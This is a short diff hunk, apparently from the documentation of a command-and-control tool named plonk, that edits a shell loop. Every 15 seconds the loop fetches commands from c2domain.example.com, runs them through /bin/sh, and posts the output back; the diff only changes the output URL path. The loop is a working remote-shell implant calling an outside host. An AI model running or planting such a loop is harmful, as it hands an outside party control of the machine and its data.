@@ -17,7 +17,7 @@ plonk -letsencrypt c2domain.example.com
 while :; do
         curl -s https://c2domain.example.com/t/kittens | \
         /bin/sh | \
-        curl --data-binary @- -s https://c2domain.example.com/t/kittens
+        curl --data-binary @- -s https://c2domain.example.com/o/kittens
         
         sleep 15
 done
